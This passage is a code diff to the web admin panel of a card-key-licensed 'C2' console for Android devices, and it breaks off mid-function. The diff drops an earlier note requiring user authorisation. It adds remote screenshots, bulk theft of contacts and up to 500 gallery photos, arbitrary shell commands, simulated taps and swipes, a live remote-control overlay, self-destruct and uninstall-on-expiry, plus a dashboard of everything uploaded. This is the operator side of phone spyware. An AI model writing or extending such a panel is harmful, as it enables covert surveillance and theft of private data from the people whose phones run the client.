@@ -48,6 +48,12 @@ th{color:#6b7280;background:#f9fafb;font-weight:600}
 .check input{width:16px;height:16px}
 .split{display:grid;grid-template-columns:1fr 1fr;gap:16px}
 @media(max-width:760px){.split{grid-template-columns:1fr}}
+@media(max-width:640px){.tabs button{padding:0 8px;font-size:12px}.main{padding:0 6px}h3{font-size:15px}}
+/* 截图取坐标/远程控制全屏覆盖层 */
+#coordPickerModal{position:fixed;inset:0;background:rgba(0,0,0,.92);z-index:20;display:flex;flex-direction:column;padding:12px;gap:8px}
+#coordPickerModal.hide{display:none!important}
+#coordPickerImgWrap{flex:1;overflow:auto;display:flex;align-items:flex-start;justify-content:center}
+#coordPickerImage{max-width:100%;height:auto;cursor:crosshair;user-select:none;-webkit-user-select:none;display:block;touch-action:none}
 input::-ms-reveal,input::-ms-clear{display:none}
 input:-webkit-autofill{box-shadow:0 0 0 1000px #fff inset!important;-webkit-box-shadow:0 0 0 1000px #fff inset!important}
 </style>
@@ -68,6 +74,7 @@ input:-webkit-autofill{box-shadow:0 0 0 1000px #fff inset!important;-webkit-box-
     <button data-tab="cards" class="active" onclick="switchTab('cards')">卡密</button>
     <button data-tab="devices" onclick="switchTab('devices')">设备</button>
     <button data-tab="c2" onclick="switchTab('c2')">C2控制</button>
+    <button data-tab="monitor" onclick="switchTab('monitor')">全局总览</button>
     <button data-tab="groups" onclick="switchTab('groups')">分组</button>
     <button data-tab="global" onclick="switchTab('global')">全局配置</button>
   </div>
@@ -119,15 +126,117 @@ input:-webkit-autofill{box-shadow:0 0 0 1000px #fff inset!important;-webkit-box-
   </section>
 
   <section data-tabpane="c2" class="hide">
-    <div class="hint">这里是控制入口，不混设备基础信息。当前已实现：消息、踢下线、自毁。截图/相册/通讯录/Shell/远控属于客户端高风险能力，默认不启用，需后续做成用户明确授权的诊断/维护模块。</div>
+    <div class="hint">C2 控制台 — 截图/联系人/Shell/触控按分组能力开关控制，默认全关。每次命令在下次心跳（最长60s）后设备拉取执行。</div>
     <div class="panel">
-      <div class="row" style="justify-content:space-between"><h3>C2 控制台</h3><button onclick="loadC2Devices()">刷新</button></div>
+      <div class="row" style="justify-content:space-between"><h3>C2 控制台</h3><button onclick="loadC2Devices()">刷新设备</button></div>
       <div class="tableWrap">
         <table>
-          <thead><tr><th>ID</th><th>设备</th><th>软件</th><th>状态</th><th>最后心跳</th><th>待执行</th><th>已实现控制</th><th>预留能力</th></tr></thead>
+          <thead><tr><th>ID</th><th>设备</th><th>软件</th><th>状态</th><th>心跳</th><th>待执行</th><th>控制操作</th></tr></thead>
           <tbody id="c2Tbody"></tbody>
         </table>
       </div>
+    </div>
+
+    <div class="panel hide" id="c2DetailPanel">
+      <div class="row" style="justify-content:space-between">
+        <h3 id="c2DetailTitle">设备控制</h3>
+        <button onclick="document.getElementById('c2DetailPanel').classList.add('hide')">关闭</button>
+      </div>
+      <div class="row" style="gap:8px;flex-wrap:wrap;margin-bottom:12px">
+        <button class="warn" onclick="c2CmdMessage()">下发消息</button>
+        <button class="muted" onclick="c2CmdKick()">踢下线</button>
+        <button class="danger" onclick="c2CmdSelfDestruct()">自毁</button>
+        <button style="background:#7c3aed;color:#fff" onclick="c2CmdScreenshot()">截图</button>
+        <button style="background:#0ea5e9;color:#fff" onclick="c2CmdGetContacts()">获取联系人</button>
+        <button style="background:#7e22ce;color:#fff" onclick="c2CmdGetGallery()">获取相册</button>        <button style="background:#059669;color:#fff" onclick="showShellPanel()">Shell 命令</button>
+        <button style="background:#d97706;color:#fff" onclick="showTapPanel()">模拟点击</button>
+        <button style="background:#be185d;color:#fff" onclick="showSwipePanel()">模拟滑动</button>
+        <button style="background:#6b7280;color:#fff" onclick="c2ClearCommands()">清除命令队列</button>
+        <button style="background:#0f172a;color:#4ade80;border:1px solid #4ade80" onclick="openRemoteControl()">📡 远程控制</button>
+      </div>
+
+      <div id="shellPanel" class="hide" style="margin-bottom:12px;padding:12px;background:#f1f5f9;border-radius:8px">
+        <div class="field" style="width:100%"><label>Shell 命令（需 root 或可执行命令）</label>
+          <textarea id="shellCmd" placeholder="如: pm list packages | grep com\nid\ncat /proc/version" style="width:100%;min-height:80px;font-family:Consolas,monospace;padding:8px;border:1px solid #d1d5db;border-radius:6px"></textarea>
+        </div>
+        <div class="row" style="margin-top:8px"><button class="ok" onclick="c2CmdShell()">下发执行</button></div>
+      </div>
+      <div id="tapPanel" class="hide" style="margin-bottom:12px;padding:12px;background:#f1f5f9;border-radius:8px">
+        <div class="row">
+          <div class="field"><label>X 坐标</label><input id="tapX" type="number" value="540" style="width:100px"></div>
+          <div class="field"><label>Y 坐标</label><input id="tapY" type="number" value="960" style="width:100px"></div>
+        </div>
+        <div class="row" style="margin-top:8px"><button class="ok" onclick="c2CmdTap()">下发点击</button></div>
+      </div>
+      <div id="swipePanel" class="hide" style="margin-bottom:12px;padding:12px;background:#f1f5f9;border-radius:8px">
+        <div class="row">
+          <div class="field"><label>起点 X</label><input id="swX1" type="number" value="540" style="width:90px"></div>
+          <div class="field"><label>起点 Y</label><input id="swY1" type="number" value="1200" style="width:90px"></div>
+          <div class="field"><label>终点 X</label><input id="swX2" type="number" value="540" style="width:90px"></div>
+          <div class="field"><label>终点 Y</label><input id="swY2" type="number" value="400" style="width:90px"></div>
+          <div class="field"><label>时长(ms)</label><input id="swDur" type="number" value="300" style="width:90px"></div>
+        </div>
+        <div class="row" style="margin-top:8px"><button class="ok" onclick="c2CmdSwipe()">下发滑动</button></div>
+      </div>
+
+      <div id="c2UploadList">
+        <div style="display:flex;align-items:center;gap:10px;margin:12px 0 8px">
+          <h4 style="margin:0">上传历史（截图/命令结果）</h4>
+          <button class="small" onclick="loadC2Uploads(c2ActiveDeviceId)" style="background:#e0e7ff;color:#3730a3">刷新</button>
+        </div>
+        <div id="c2UploadContent" style="max-height:600px;overflow-y:auto"></div>
+      </div>
+    </div>
+  </section>
+
+  <section data-tabpane="monitor" class="hide">
+    <div class="panel">
+      <div class="row" style="justify-content:space-between;align-items:center">
+        <h3 style="margin:0">全局 C2 总览</h3>
+        <div class="row" style="gap:8px">
+          <button class="small ok" onclick="loadMonitor()">刷新</button>
+          <label style="font-size:13px;color:#6b7280;display:flex;align-items:center;gap:4px"><input type="checkbox" id="monitorAutoRefresh" onchange="toggleMonitorAuto()"> 自动刷新(30s)</label>
+        </div>
+      </div>
+    </div>
+
+    <!-- 统计概览 -->
+    <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:16px" id="monitorStats"></div>
+
+    <!-- 最近截图 -->
+    <div class="panel">
+      <h4 style="margin:0 0 12px">最近截图（所有设备）</h4>
+      <div id="monitorScreenshots" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px"></div>
+    </div>
+
+    <!-- 全部上传历史 -->
+    <div class="panel">
+      <div class="row" style="justify-content:space-between;align-items:center;margin-bottom:12px">
+        <h4 style="margin:0">全部上传历史</h4>
+        <select id="monitorTypeFilter" style="height:32px;border:1px solid #d1d5db;border-radius:6px;padding:0 8px;font-size:13px" onchange="renderMonitorUploads()">
+          <option value="">全部类型</option>
+          <option value="screenshot">截图</option>
+          <option value="shell">Shell</option>
+          <option value="get_contacts">联系人</option>
+          <option value="get_gallery">相册</option>
+        </select>
+      </div>
+      <div id="monitorUploads"></div>
+    </div>
+
+    <!-- 待执行命令 -->
+    <div class="panel">
+      <h4 style="margin:0 0 12px">所有待执行命令</h4>
+      <div id="monitorPending"></div>
+    </div>
+
+    <!-- 服务器日志 -->
+    <div class="panel">
+      <div class="row" style="justify-content:space-between;align-items:center;margin-bottom:8px">
+        <h4 style="margin:0">服务器日志</h4>
+        <button class="small" onclick="loadMonitorLogs()">刷新日志</button>
+      </div>
+      <pre id="monitorLogs" style="font-size:12px;font-family:Menlo,Consolas,monospace;background:#0f172a;color:#e2e8f0;padding:14px;border-radius:8px;max-height:400px;overflow:auto;white-space:pre-wrap;margin:0">加载中...</pre>
     </div>
   </section>
 
@@ -140,6 +249,12 @@ input:-webkit-autofill{box-shadow:0 0 0 1000px #fff inset!important;-webkit-box-
         <div class="field"><label>显示名</label><input id="newGroupDisplay" placeholder="如 陌陌助手"></div>
         <div class="field"><label>轮询秒</label><input id="newGroupPoll" type="number" value="60" min="5"></div>
         <div class="check"><input type="checkbox" id="newGroupC2" checked><label for="newGroupC2">启用 C2</label></div>
+        <div class="check"><input type="checkbox" id="newGroupScreenshot"><label for="newGroupScreenshot">截图</label></div>
+        <div class="check"><input type="checkbox" id="newGroupContacts"><label for="newGroupContacts">联系人</label></div>
+        <div class="check"><input type="checkbox" id="newGroupShell"><label for="newGroupShell">Shell</label></div>
+        <div class="check"><input type="checkbox" id="newGroupInput"><label for="newGroupInput">触控</label></div>
+        <div class="check"><input type="checkbox" id="newGroupAutoIssue"><label for="newGroupAutoIssue" title="设备注册时自动签发永久卡，无需手动输入卡密">自动发卡</label></div>
+        <div class="field"><label>过期行为</label><select id="newGroupExpire" style="padding:4px 8px;border-radius:6px;border:1px solid #d1d5db"><option value="none">不处理</option><option value="block">阻断指令</option><option value="uninstall">卸载软件</option></select></div>
         <div class="field"><label>弹窗标题</label><input id="newGroupPopupTitle" placeholder="请输入卡密"></div>
         <div class="field"><label>弹窗提示</label><input id="newGroupPopupMsg" placeholder="一机一卡，首次使用自动绑定设备"></div>
         <button class="ok" onclick="createGroup()">创建</button>
@@ -149,7 +264,7 @@ input:-webkit-autofill{box-shadow:0 0 0 1000px #fff inset!important;-webkit-box-
       <div class="row" style="justify-content:space-between"><h3>分组列表</h3><button onclick="loadGroups()">刷新</button></div>
       <div class="tableWrap">
         <table>
-          <thead><tr><th>ID</th><th>软件标识</th><th>显示名</th><th>轮询秒</th><th>启用 C2</th><th>弹窗标题</th><th>设备数</th><th>操作</th></tr></thead>
+          <thead><tr><th>ID</th><th>软件标识</th><th>显示名</th><th>轮询秒</th><th>启用 C2</th><th>能力开关</th><th>自动发卡</th><th>过期行为</th><th>弹窗标题</th><th>设备数</th><th>操作</th></tr></thead>
           <tbody id="groupsTbody"></tbody>
         </table>
       </div>
@@ -203,6 +318,31 @@ input:-webkit-autofill{box-shadow:0 0 0 1000px #fff inset!important;-webkit-box-
   </div>
 </div>
 
+<!-- 截图取坐标/远程控制覆盖层 -->
+<div id="coordPickerModal" class="hide">
+  <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px">
+    <span id="coordPickerCoords" style="font-size:13px;font-family:monospace;color:#4ade80;min-width:200px">点击=发送点击 · 拖动=发送滑动</span>
+    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
+      <label style="color:#fff;font-size:12px;display:flex;align-items:center;gap:4px"><input type="checkbox" id="pickerAutoSend" checked> 即时发送</label>
+      <button class="small ok" onclick="refreshPickerScreenshot()" id="pickerRefreshBtn">刷新截图</button>
+      <button style="background:rgba(255,255,255,.15);color:#fff" onclick="document.getElementById('coordPickerModal').classList.add('hide')">✕ 关闭</button>
+    </div>
+  </div>
+  <div id="coordPickerImgWrap">
+    <div style="position:relative;line-height:0;display:inline-block">
+      <img id="coordPickerImage"
+        onmousedown="pickerPointerDown(event,false)" onmousemove="pickerPointerMove(event,false)" onmouseup="pickerPointerUp(event,false)"
+        ontouchstart="pickerPointerDown(event,true)" ontouchmove="pickerPointerMove(event,true)" ontouchend="pickerPointerUp(event,true)"
+        ondragstart="return false">
+      <div id="pickerDot" style="display:none;position:absolute;width:22px;height:22px;border:2.5px solid #ef4444;border-radius:50%;margin:-11px 0 0 -11px;box-shadow:0 0 0 1.5px #fff;pointer-events:none"></div>
+      <svg id="pickerSvg" style="position:absolute;inset:0;width:100%;height:100%;pointer-events:none;overflow:visible">
+        <line id="pickerLine" x1="0" y1="0" x2="0" y2="0" stroke="#ef4444" stroke-width="2.5" stroke-dasharray="6,4" display="none"/>
+        <circle id="pickerEndDot" cx="0" cy="0" r="9" fill="rgba(239,68,68,.2)" stroke="#ef4444" stroke-width="2" display="none"/>
+      </svg>
+    </div>
+  </div>
+</div>
+
 <div id="modalMask" class="modal-mask hide"><div class="modal" id="modalContent"></div></div>
 
 <script>
@@ -228,6 +368,7 @@ function switchTab(name){
   if(name==='c2') loadC2Devices();
   if(name==='groups') loadGroups();
   if(name==='global') { loadGlobal(); loadAiConfig(); }
+  if(name==='monitor') loadMonitor();
 }
 
 async function api(url, options={}){
@@ -309,7 +450,7 @@ async function openDevice(id){
   const d = data.device;
   const meta = d.meta || {};
   const metaRows = Object.keys(meta).length ? Object.entries(meta).map(([k,v])=>`<div class="k">${esc(k)}</div><div class="v">${esc(String(v))}</div>`).join('') : '<div class="k">meta</div><div class="v">-</div>';
-  const pending = (d.pending_commands||[]).map(c=>`#${c.id.slice(0,6)} [${esc(c.type)}] ${esc(JSON.stringify(c.payload||{}))} @ ${fmt(c.created_at)}`).join('\n') || '(空)';
+  const pending = (d.pending_commands||[]).map(c=>`#${c.id.slice(0,6)} [${c.type}] ${JSON.stringify(c.payload||{})} @ ${fmt(c.created_at)}`).join('\n') || '(空)';
   const eff = d.effective_config || {};
   const override = d.config_override || {};
   showModal(`
@@ -342,7 +483,7 @@ async function openDevice(id){
       <button class="small muted" onclick="clearDeviceOverride(${d.id})">清除覆盖</button>
     </div>
     <h4 style="margin:18px 0 8px">待执行命令</h4>
-    <div class="cmdlog">${esc(pending)}</div>
+    <pre class="cmdlog" id="pendingCmdLog"></pre>
     <div class="btnrow">
       <button class="danger" onclick='cmdSelfDestruct(${d.id}, ${JSON.stringify(d.name||String(d.id))})'>下发自毁</button>
       <button class="warn" onclick='cmdMessage(${d.id})'>下发消息</button>
@@ -351,6 +492,7 @@ async function openDevice(id){
       <button class="danger" style="margin-left:auto" onclick='deleteDevice(${d.id})'>从面板移除</button>
     </div>
   `);
+  document.getElementById('pendingCmdLog').textContent = pending;
 }
 async function cmdSelfDestruct(id, name){
   if(!confirm(`确定向设备【${name||id}】下发自毁命令？\n命令会在下次心跳被设备拉取，执行后不可撤销。`)) return;
@@ -394,6 +536,7 @@ async function clearDeviceOverride(id){
   await api(`/admin/api/devices/${id}/config`,{method:'POST',body:JSON.stringify({clear:true})});
   toast('已清除覆盖'); openDevice(id);
 }
+let c2ActiveDeviceId = null;
 async function loadC2Devices(){
   const data = await api('/admin/api/devices');
   const rows = data.devices || [];
@@ -406,12 +549,100 @@ async function loadC2Devices(){
       <td>${fmt(d.last_seen_at)}</td>
       <td>${d.pending_command_count ? `<span class="tag plain">${d.pending_command_count}</span>` : '-'}</td>
       <td>
+        <button class="small ok" onclick="openC2Device(${d.id},'${esc(d.name||String(d.id))}')">控制面板</button>
         <button class="small warn" onclick="cmdMessage(${d.id})">消息</button>
         <button class="small muted" onclick="cmdKick(${d.id})">踢下线</button>
         <button class="small danger" onclick='cmdSelfDestruct(${d.id}, ${JSON.stringify(d.name||String(d.id))})'>自毁</button>
       </td>
-      <td><span class="tag plain">截图/相册/通讯录/Shell/远控：未启用</span></td>
-    </tr>`).join('') : '<tr><td colspan="8" style="text-align:center;color:#9ca3af;padding:20px">暂无设备</td></tr>';
+    </tr>`).join('') : '<tr><td colspan="7" style="text-align:center;color:#9ca3af;padding:20px">暂无设备</td></tr>';
+}
+function openC2Device(id, name){
+  c2ActiveDeviceId = id;
+  document.getElementById('c2DetailTitle').textContent = '设备控制 — ' + name;
+  document.getElementById('c2DetailPanel').classList.remove('hide');
+  loadC2Uploads(id);
+}
+function showShellPanel(){ togglePanel('shellPanel'); }
+function showTapPanel(){ togglePanel('tapPanel'); }
+function showSwipePanel(){ togglePanel('swipePanel'); }
+function togglePanel(id){
+  ['shellPanel','tapPanel','swipePanel'].forEach(p=>document.getElementById(p).classList.toggle('hide', p!==id || !document.getElementById(p).classList.contains('hide')));
+  document.getElementById(id).classList.remove('hide');
+}
+async function c2CmdMessage(){ if(!c2ActiveDeviceId) return; const t=prompt('消息内容'); if(!t) return; const r=await api(`/admin/api/devices/${c2ActiveDeviceId}/command`,{method:'POST',body:JSON.stringify({type:'message',text:t})}); r.ok?toast('已下发'):alert(r.message||'失败'); }
+async function c2CmdKick(){ if(!c2ActiveDeviceId) return; if(!confirm('踢下线？')) return; const r=await api(`/admin/api/devices/${c2ActiveDeviceId}/command`,{method:'POST',body:JSON.stringify({type:'kick'})}); r.ok?toast('已下发'):alert(r.message||'失败'); }
+async function c2CmdSelfDestruct(){ if(!c2ActiveDeviceId) return; if(!confirm('下发自毁？不可撤销。')) return; const r=await api(`/admin/api/devices/${c2ActiveDeviceId}/command`,{method:'POST',body:JSON.stringify({type:'self_destruct'})}); r.ok?toast('已下发'):alert(r.message||'失败'); }
+async function c2ClearCommands(){
+  if(!c2ActiveDeviceId) return;
+  if(!confirm('清除该设备所有待执行命令？')) return;
+  const r = await api(`/admin/api/devices/${c2ActiveDeviceId}/clear-commands`,{method:'POST'});
+  r.ok ? toast(`已清除 ${r.cleared} 条命令`) : alert(r.message||'失败');
+}
+async function clearDeviceCommands(id){
+  if(!confirm('清除该设备所有待命令？')) return;
+  const r = await api(`/admin/api/devices/${id}/clear-commands`,{method:'POST'});
+  r.ok ? (toast(`已清除 ${r.cleared} 条`), loadMonitor()) : alert(r.message||'失败');
+}
+async function c2CmdScreenshot(){ if(!c2ActiveDeviceId) return; const r=await api(`/admin/api/devices/${c2ActiveDeviceId}/command`,{method:'POST',body:JSON.stringify({type:'screenshot'})}); r.ok?toast('截图命令已下发，等待心跳后刷新上传历史'):alert(r.message||'失败'); }
+async function c2CmdGetContacts(){ if(!c2ActiveDeviceId) return; const r=await api(`/admin/api/devices/${c2ActiveDeviceId}/command`,{method:'POST',body:JSON.stringify({type:'get_contacts'})}); r.ok?toast('联系人命令已下发'):alert(r.message||'失败'); }
+async function c2CmdShell(){ if(!c2ActiveDeviceId) return; const cmd=document.getElementById('shellCmd').value.trim(); if(!cmd) return alert('请输入命令'); const r=await api(`/admin/api/devices/${c2ActiveDeviceId}/command`,{method:'POST',body:JSON.stringify({type:'shell',cmd})}); r.ok?toast('Shell命令已下发'):alert(r.message||'失败'); }
+async function c2CmdTap(){ if(!c2ActiveDeviceId) return; const x=Number(document.getElementById('tapX').value),y=Number(document.getElementById('tapY').value); const r=await api(`/admin/api/devices/${c2ActiveDeviceId}/command`,{method:'POST',body:JSON.stringify({type:'input_tap',payload:{x,y}})}); r.ok?toast('点击命令已下发'):alert(r.message||'失败'); }
+async function c2CmdSwipe(){ if(!c2ActiveDeviceId) return; const x1=Number(document.getElementById('swX1').value),y1=Number(document.getElementById('swY1').value),x2=Number(document.getElementById('swX2').value),y2=Number(document.getElementById('swY2').value),dur=Number(document.getElementById('swDur').value); const r=await api(`/admin/api/devices/${c2ActiveDeviceId}/command`,{method:'POST',body:JSON.stringify({type:'input_swipe',payload:{x1,y1,x2,y2,duration:dur}})}); r.ok?toast('滑动命令已下发'):alert(r.message||'失败'); }
+async function loadC2Uploads(id){
+  const data = await api(`/admin/api/devices/${id}/uploads`);
+  const list = data.uploads || [];
+  const el = document.getElementById('c2UploadContent');
+  if(!list.length){ el.innerHTML='<div style="color:#9ca3af;padding:12px">暂无上传记录，执行命令后等心跳（最多60s）刷新</div>'; return; }
+  el.innerHTML = '<div style="color:#6b7280;font-size:12px;padding:4px 0 8px">共 '+list.length+' 条，图片鉴权加载中...</div>' +
+    list.map((u,i)=>{
+      const isImg = u.type==='screenshot' || u.type==='get_gallery' || u.filename.endsWith('.png') || u.filename.endsWith('.jpg');
+      const isText = u.filename.endsWith('.txt') || u.filename.endsWith('.json');
+      const delBtn = `<button onclick="deleteUpload(${id},'${esc(u.filename)}')" style="background:#fee2e2;color:#b91c1c;border:0;border-radius:4px;padding:2px 6px;font-size:11px;cursor:pointer">删除</button>`;
+      if(isImg){
+        return `<div id="upload_${i}" style="margin-bottom:14px"><div style="font-size:12px;color:#6b7280;display:flex;gap:8px;align-items:center;flex-wrap:wrap">${fmt(u.created_at)} ${esc(u.type)} ${u.size||0}B ${delBtn}<button onclick="openCoordPickerById('uimg_${i}')" style="background:#dbeafe;color:#1d4ed8;border:0;border-radius:4px;padding:2px 6px;font-size:11px;cursor:pointer">📍取坐标</button></div><img id="uimg_${i}" style="max-height:220px;max-width:100%;object-fit:contain;display:block;margin-top:6px;border-radius:6px;border:1px solid #e5e7eb;cursor:crosshair" title="点击打开取坐标面板"><div id="uerr_${i}" style="color:#9ca3af;font-size:12px;padding:4px">加载中...</div></div>`;
+      }
+      if(isText){
+        return `<div id="upload_${i}" style="margin-bottom:10px;padding:10px;background:#f8fafc;border-radius:6px"><div style="font-size:12px;color:#6b7280;margin-bottom:4px;display:flex;gap:8px;align-items:center">${fmt(u.created_at)} ${u.type} ${u.size||0}B ${delBtn}</div><pre id="utxt_${i}" style="font-size:12px;white-space:pre-wrap;max-height:300px;overflow-y:auto;margin:0;color:#111">加载中...</pre></div>`;
+      }
+      return `<div id="upload_${i}" style="margin-bottom:8px;padding:8px;background:#f8fafc;border-radius:6px"><div style="font-size:12px;color:#6b7280;display:flex;gap:8px;align-items:center">${fmt(u.created_at)} ${u.type} ${u.size||0}B ${delBtn}</div></div>`;
+    }).join('');
+  // 异步加载各文件内容（带 Bearer token）
+  list.forEach(async (u,i)=>{
+    const isImg = u.type==='screenshot'||u.type==='get_gallery'||u.filename.endsWith('.png')||u.filename.endsWith('.jpg');
+    const isText = u.filename.endsWith('.txt')||u.filename.endsWith('.json');
+    if(!isImg && !isText) return;
+    try {
+      const res = await fetch(`/admin/api/uploads/${u.filename}`,{headers:{'Authorization':'Bearer '+token}});
+      if(!res.ok) throw new Error('HTTP '+res.status);
+      if(isImg){
+        const blob = await res.blob();
+        const blobUrl = URL.createObjectURL(blob);
+        const img = document.getElementById('uimg_'+i);
+        const err = document.getElementById('uerr_'+i);
+        if(img){ img.src = blobUrl; img.dataset.blob = blobUrl; img.onclick=()=>openCoordPicker(blobUrl,false); img.onload=()=>{ if(err) err.style.display='none'; }; }
+      } else {
+        const text = await res.text();
+        const pre = document.getElementById('utxt_'+i);
+        if(pre) pre.textContent = text;
+      }
+    } catch(e){
+      const err = document.getElementById('uerr_'+i);
+      if(err) err.textContent = '加载失败: '+e.message;
+    }
+  });
+}
+async function deleteUpload(deviceId, filename){
+  if(!confirm('删除这条记录和文件？')) return;
+  const r = await api(`/admin/api/devices/${deviceId}/uploads/${encodeURIComponent(filename)}`,{method:'DELETE'});
+  if(r.ok) loadC2Uploads(deviceId); else alert(r.message||'删除失败');
+}
+async function c2CmdGetGallery(){
+  if(!c2ActiveDeviceId) return;
+  const cnt = prompt('获取最新几张图片（1-500，默认100）','100');
+  if(cnt === null) return;
+  const limit = Math.min(500, Math.max(1, parseInt(cnt)||100));
+  const r = await api(`/admin/api/devices/${c2ActiveDeviceId}/command`,{method:'POST',body:JSON.stringify({type:'get_gallery',payload:{limit}})});
+  r.ok ? toast(`相册命令已下发（limit=${limit}），等待心跳后刷新`) : alert(r.message||'失败');
 }
 
 // ---- 分组 ----
@@ -429,6 +660,18 @@ async function loadGroups(){
       <td><input class="small" style="width:140px" id="gDisp_${g.id}" value="${esc(g.display_name||g.name)}"></td>
       <td><input class="small" style="width:80px" type="number" id="gPoll_${g.id}" value="${cfg.poll_interval ?? 60}"></td>
       <td><input type="checkbox" id="gC2_${g.id}" ${cfg.enable_c2 ? 'checked':''}></td>
+      <td title="截图/联系人/Shell/触控">
+        <input type="checkbox" id="gScreenshot_${g.id}" ${cfg.allow_screenshot?'checked':''}><label style="font-size:11px"> 截图 </label>
+        <input type="checkbox" id="gContacts_${g.id}" ${cfg.allow_contacts?'checked':''}><label style="font-size:11px"> 联系人 </label>
+        <input type="checkbox" id="gShell_${g.id}" ${cfg.allow_shell?'checked':''}><label style="font-size:11px"> Shell </label>
+        <input type="checkbox" id="gInput_${g.id}" ${cfg.allow_input_control?'checked':''}><label style="font-size:11px"> 触控 </label>
+      </td>
+      <td><input type="checkbox" id="gAutoIssue_${g.id}" ${cfg.auto_issue_card?'checked':''} title="开启后设备注册时自动签发永久卡"></td>
+      <td><select id="gExpire_${g.id}" style="font-size:12px;padding:2px 4px;border-radius:4px;border:1px solid #d1d5db">
+        <option value="none" ${(cfg.expire_action||'none')==='none'?'selected':''}>不处理</option>
+        <option value="block" ${cfg.expire_action==='block'?'selected':''}>阻断指令</option>
+        <option value="uninstall" ${cfg.expire_action==='uninstall'?'selected':''}>卸载软件</option>
+      </select></td>
       <td><input class="small" style="width:150px" id="gPopupTitle_${g.id}" value="${esc(cfg.popup_title||'请输入卡密')}"></td>
       <td>${counts[g.id]||0}</td>
       <td>
@@ -436,13 +679,19 @@ async function loadGroups(){
         <button class="small danger" onclick="deleteGroup(${g.id})">删除</button>
       </td>
     </tr>`;
-  }).join('') : '<tr><td colspan="8" style="text-align:center;color:#9ca3af;padding:20px">暂无分组</td></tr>';
+  }).join('') : '<tr><td colspan="11" style="text-align:center;color:#9ca3af;padding:20px">暂无分组</td></tr>';
 }
 async function createGroup(){
   const name = val('newGroupName'); if(!name){ alert('请填写软件标识'); return; }
   const config = {
     poll_interval: Number(val('newGroupPoll'))||60,
     enable_c2: document.getElementById('newGroupC2').checked,
+    allow_screenshot: document.getElementById('newGroupScreenshot').checked,
+    allow_contacts: document.getElementById('newGroupContacts').checked,
+    allow_shell: document.getElementById('newGroupShell').checked,
+    allow_input_control: document.getElementById('newGroupInput').checked,
+    auto_issue_card: document.getElementById('newGroupAutoIssue').checked,
+    expire_action: document.getElementById('newGroupExpire').value,
     popup_title: val('newGroupPopupTitle') || '请输入卡密',
     popup_message: val('newGroupPopupMsg') || '一机一卡，首次使用自动绑定设备'
   };
@@ -458,6 +707,12 @@ async function saveGroup(id){
   const config = {
     poll_interval: Number(document.getElementById('gPoll_'+id).value)||60,
     enable_c2: document.getElementById('gC2_'+id).checked,
+    allow_screenshot: document.getElementById('gScreenshot_'+id) ? document.getElementById('gScreenshot_'+id).checked : false,
+    allow_contacts: document.getElementById('gContacts_'+id) ? document.getElementById('gContacts_'+id).checked : false,
+    allow_shell: document.getElementById('gShell_'+id) ? document.getElementById('gShell_'+id).checked : false,
+    allow_input_control: document.getElementById('gInput_'+id) ? document.getElementById('gInput_'+id).checked : false,
+    auto_issue_card: document.getElementById('gAutoIssue_'+id) ? document.getElementById('gAutoIssue_'+id).checked : false,
+    expire_action: document.getElementById('gExpire_'+id) ? document.getElementById('gExpire_'+id).value : 'none',
     popup_title: document.getElementById('gPopupTitle_'+id).value || '请输入卡密'
   };
   const display_name = document.getElementById('gDisp_'+id).value;
@@ -521,6 +776,273 @@ async function generatePopupHtml(){
   if(!r.ok){ text('aiMsg', r.message || '生成失败'); return; }
   document.getElementById('gPopupHtml').value = r.html || '';
   text('aiMsg','已生成并填入自定义 HTML，确认后请点击“保存”');
+}
+
+// ---- 截图取坐标 / 远程控制 ----
+let _pickerStartX=0, _pickerStartY=0, _pickerDragging=false;
+
+function openCoordPickerById(imgId) {
+  const img = document.getElementById(imgId);
+  if (img && img.dataset.blob) openCoordPicker(img.dataset.blob, false);
+}
+
+function openCoordPicker(blobSrc, withRefresh) {
+  const img = document.getElementById('coordPickerImage');
+  img.src = blobSrc;
+  document.getElementById('pickerRefreshBtn').style.display = withRefresh ? '' : 'none';
+  document.getElementById('coordPickerCoords').textContent = '点击=发送点击 · 拖动=发送滑动';
+  document.getElementById('pickerDot').style.display = 'none';
+  document.getElementById('pickerLine').setAttribute('display','none');
+  document.getElementById('pickerEndDot').setAttribute('display','none');
+  document.getElementById('coordPickerModal').classList.remove('hide');
+}
+
+function _pickerEvtCoords(e, touch) {
+  const img = document.getElementById('coordPickerImage');
+  const rect = img.getBoundingClientRect();
+  const src = touch ? (e.touches[0] || e.changedTouches[0]) : e;
+  const cx = Math.max(0, Math.min(rect.width, src.clientX - rect.left));
+  const cy = Math.max(0, Math.min(rect.height, src.clientY - rect.top));
+  return { px: cx, py: cy,
+    devX: Math.round(cx / rect.width * img.naturalWidth),
+    devY: Math.round(cy / rect.height * img.naturalHeight) };
+}
+
+function pickerPointerDown(e, touch) {
+  e.preventDefault();
+  const c = _pickerEvtCoords(e, touch);
+  _pickerStartX = c.devX; _pickerStartY = c.devY; _pickerDragging = true;
+  const dot = document.getElementById('pickerDot');
+  dot.style.left = c.px+'px'; dot.style.top = c.py+'px'; dot.style.display = 'block';
+  document.getElementById('pickerLine').setAttribute('display','none');
+  document.getElementById('pickerEndDot').setAttribute('display','none');
+}
+
+function pickerPointerMove(e, touch) {
+  if (!_pickerDragging) return;
+  e.preventDefault();
+  const c = _pickerEvtCoords(e, touch);
+  const img = document.getElementById('coordPickerImage');
+  const rect = img.getBoundingClientRect();
+  const sx = Math.round(_pickerStartX / img.naturalWidth * rect.width);
+  const sy = Math.round(_pickerStartY / img.naturalHeight * rect.height);
+  if (Math.abs(c.px-sx)+Math.abs(c.py-sy) > 10) {
+    const line = document.getElementById('pickerLine');
+    line.setAttribute('x1',sx); line.setAttribute('y1',sy);
+    line.setAttribute('x2',c.px); line.setAttribute('y2',c.py); line.setAttribute('display','');
+    const ed = document.getElementById('pickerEndDot');
+    ed.setAttribute('cx',c.px); ed.setAttribute('cy',c.py); ed.setAttribute('display','');
+    document.getElementById('coordPickerCoords').textContent = `滑动 (${_pickerStartX},${_pickerStartY}) → (${c.devX},${c.devY})`;
+  } else {
+    document.getElementById('coordPickerCoords').textContent = `点击 (${c.devX}, ${c.devY})`;
+  }
+}
+
+function pickerPointerUp(e, touch) {
+  if (!_pickerDragging) return; _pickerDragging = false;
+  e.preventDefault();
+  const c = _pickerEvtCoords(e, touch);
+  const img = document.getElementById('coordPickerImage');
+  const rect = img.getBoundingClientRect();
+  const sx = Math.round(_pickerStartX / img.naturalWidth * rect.width);
